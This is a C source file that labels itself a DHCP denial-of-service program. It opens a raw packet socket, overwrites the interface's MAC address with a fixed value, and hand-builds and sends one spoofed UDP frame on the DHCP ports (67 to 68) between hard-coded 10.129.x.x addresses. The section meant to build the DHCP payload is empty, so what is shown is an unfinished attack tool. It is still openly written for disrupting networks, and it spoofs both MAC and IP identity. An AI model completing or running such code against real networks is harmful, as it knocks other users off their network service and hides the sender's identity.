/*
dcmp denial_of_service program.
march 2019
by wang zih_min

*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <arpa/inet.h>
#include <linux/udp.h>


#define ARPHRD_ETHER 	1
#define PACKETMAXSIZE	512


struct pseudo_udp_hdr{

	unsigned int source;
	unsigned int dest;
	unsigned char pad;
	unsigned char proto;
	unsigned short length;
	struct udphdr udp_hdr;
	unsigned char data[PACKETMAXSIZE-sizeof(struct ethhdr)-sizeof(struct iphdr)-sizeof(struct udphdr)];
};



unsigned short checksum(void* addr,int count);
void copy_macaddr(unsigned char *sll_addr,unsigned char first,unsigned char second,unsigned char third,unsigned char fourth,unsigned char fifth,unsigned char sixth);



int main(int argc,char **argv){

	if(argc!=2){
		fprintf(stderr,"usage: <dhcp_dos> <name of a connected interface>");
		exit(-1);
	}

	int sd;
	if((sd=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP)))<0){
		perror("socket()");
		exit(-1);
	}
	
////////////////////////Modify the mac address of the interface provided.
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,argv[1],IFNAMSIZ);
	printf("%s\n",itface.ifr_name);
	
	//get hwaddr of the interface
	if(ioctl(sd,SIOCGIFHWADDR, &itface) > 0){
		perror("ioctl(SIOCGIFHWADDR)");	
		exit(-1);
	}
	//check whether it is ethernet interface
	if(itface.ifr_hwaddr.sa_family!=ARPHRD_ETHER){
		fprintf(stderr,"interface provided is not a ethernet interface\n");
		exit(-1);

	}
#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<6;iii++){
		printf(":%02x",(unsigned char)(itface.ifr_hwaddr.sa_data[iii]));

	}
	printf("\n");
#endif
	//modify mac address
	copy_macaddr(itface.ifr_hwaddr.sa_data,0,(unsigned char)0xe0,(unsigned char)0x4c,(unsigned char)0x68,(unsigned char)0x03,(unsigned char)0x73);
	if(ioctl(sd, SIOCSIFHWADDR, &itface) < 0){
		perror("ioctl(SIOCSIFHWADDR)");	
		exit(-1);
	}
#ifdef debugmacaddr
	printf("mac_addr");
	for(int iii=0;iii<8;iii++){
		printf(":%02x",(unsigned char)itface.ifr_hwaddr.sa_data[iii]);

	}
	printf("\n");
#endif
	//get interface index
	if(ioctl(sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocol=htons(ETH_P_IP);
	if(bind(sd,(struct sockaddr*)&ifaddr,sizeof(struct sockaddr_ll))<0){
		perror("bind()");
		exit(-1);
	}
	
///////////////////////////////start to construct datagram
	unsigned char packet[PACKETMAXSIZE];
	memset(packet,0,PACKETMAXSIZE);
	struct ethhdr *ether=(struct ethhdr*)packet;
	struct iphdr *ip=(struct iphdr*)(packet+sizeof(struct ethhdr));
	int packet_len=PACKETMAXSIZE;//sizeof(struct ethhdr)+64;
	
	//ethernet frame header
	copy_macaddr(ether->h_dest,15,14,13,12,11,10);
	copy_macaddr(ether->h_source,0,(unsigned char)0xe0,(unsigned char)0x4c,(unsigned char)0x68,(unsigned char)0x03,(unsigned char)0x73);
	ether->h_proto=htons(ETH_P_IP);

	//ip header
	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = htons(PACKETMAXSIZE-sizeof(struct ethhdr));
	ip->frag_off = 0;
	ip->id = htons(54321);
	ip->ttl = 64;
	ip->protocol = (unsigned char)IPPROTO_UDP; //17
	inet_pton(AF_INET,"10.129.234.200",&(ip->saddr));
	inet_pton(AF_INET,"10.129.234.201",&(ip->daddr));
	ip->check=checksum(ip,20);


	////////////////////Create a pseudo udp header for udp checksum.
	struct pseudo_udp_hdr p_udp;
	memset(&p_udp,0,sizeof(struct pseudo_udp_hdr));	

	inet_pton(AF_INET,"10.129.234.200",&(p_udp.source));
	inet_pton(AF_INET,"10.129.234.201",&(p_udp.dest));
	p_udp.pad=0;
	p_udp.proto=IPPROTO_UDP;
	p_udp.length=htons(44);
	p_udp.udp_hdr.source=htons(67);
	p_udp.udp_hdr.dest=htons(68);
	p_udp.udp_hdr.len=htons(PACKETMAXSIZE-sizeof(struct ethhdr)-sizeof(struct iphdr));
	p_udp.udp_hdr.check=0;
	



///////////////////////////////////////Construct dhcp packet
	






	p_udp.udp_hdr.check=checksum(&p_udp,sizeof(struct pseudo_udp_hdr));

/////////////////////////////////////Copy pseudo udp header to real udp header.

	//Real udp header
	struct udphdr *udp=(struct udphdr*)(packet+sizeof(struct iphdr)+sizeof(struct ethhdr));
	memcpy(udp,&(p_udp.udp_hdr),PACKETMAXSIZE-sizeof(struct ethhdr)-sizeof(struct iphdr));

///////////////////////////////////Ready to send packet.
///////////////////////////////////Specify MAC address of the destination dhcp server.

	struct sockaddr_ll destifaddr;
	destifaddr.sll_halen=ETH_ALEN;
	destifaddr.sll_ifindex=itface.ifr_ifindex;
	copy_macaddr((unsigned char*)destifaddr.sll_addr,15,14,13,12,11,10);
	if(sendto(sd,packet,packet_len,0,(struct sockaddr*)&destifaddr,sizeof(struct sockaddr_ll))<0){
		perror("sendto()");
		exit(-1);
	}



	return 0;

}
void copy_macaddr(unsigned char *sll_addr,unsigned char first,unsigned char second,unsigned char third,unsigned char fourth,unsigned char fifth,unsigned char sixth){

	if(first>=0&&first<=255) sll_addr[0]=first;
	else{
		fprintf(stderr,"mac address error\n");
		exit(-1);
	}
	if(second>=0&&second<=255) sll_addr[1]=second;
	else{
		fprintf(stderr,"mac address error\n");
		exit(-1);
	}
	if(third>=0&&third<=255) sll_addr[2]=third;
	else{
		fprintf(stderr,"mac address error\n");
		exit(-1);
	}
	if(fourth>=0&&fourth<=255) sll_addr[3]=fourth;
	else{
		fprintf(stderr,"mac address error\n");
		exit(-1);
	}
	if(fifth>=0&&fifth<=255) sll_addr[4]=fifth;
	else{
		fprintf(stderr,"mac address error\n");
		exit(-1);
	}
	if(sixth>=0&&sixth<=255) sll_addr[5]=sixth;
	else{
		fprintf(stderr,"mac address error\n");
		exit(-1);
	}
	return;
}

unsigned short checksum(void* addr,int count){
           /* Compute Internet Checksum for "count" bytes
            *         beginning at location "addr".
            */
       register long sum = 0;

        while( count > 1 )  {
           /*  This is the inner loop */
               sum += * (unsigned short*) addr;
			   addr+=2;
               count -= 2;
       }

           /*  Add left-over byte, if any */
       if( count > 0 )
               sum += * (unsigned char *) addr;

           /*  Fold 32-bit sum to 16 bits */
       while (sum>>16)
           sum = (sum & 0xffff) + (sum >> 16);

       return (unsigned short)~sum;
	  
}

